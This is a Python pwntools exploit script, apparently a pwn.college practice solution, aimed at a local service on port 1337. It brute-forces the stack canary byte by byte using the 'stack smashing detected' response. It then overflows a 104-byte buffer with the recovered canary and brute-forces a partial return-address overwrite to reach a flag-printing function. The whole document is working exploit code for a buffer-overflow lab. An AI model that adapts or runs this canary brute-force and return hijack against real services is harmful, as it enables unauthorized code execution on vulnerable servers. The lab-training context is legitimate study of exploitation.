from pwn import *


canary = bytearray()
#canary = bytearray(b'\x00H\x7f3\x12!\xd5m')
while len(canary) < 8:
    for c in range(256):
        r = remote('localhost',1337)

        r.recvuntil('Payload size:')
        length = 104 + len(canary) + 1
        r.sendline(str(length))

        payload =  b'a' * 104 + canary
        
        force = payload + bytes([c]) 
        print('force:',force)
        r.sendline(force)
        s = r.recvall(0.1)
        if s.find(b'stack smashing detected') == -1:
            canary.append(c)
            #print(canary)
            break

print(canary)


while True:
    for i in range(0,16):
        r = remote('localhost',1337)
    
        r.recvuntil('Payload size:')
        r.sendline(b'122')

        address = i * 0x1000 + 0x99a
        payload = b'a' * 104  + canary + b'a' * 8 + p16(address)


    
        r.recvuntil('Send your payload')
        r.sendline(payload)

        #p.interactive()
        s = r.recvall(1)
        print(s)
        if s.find(b'pwn.college{') != -1:
            print(s)
            break
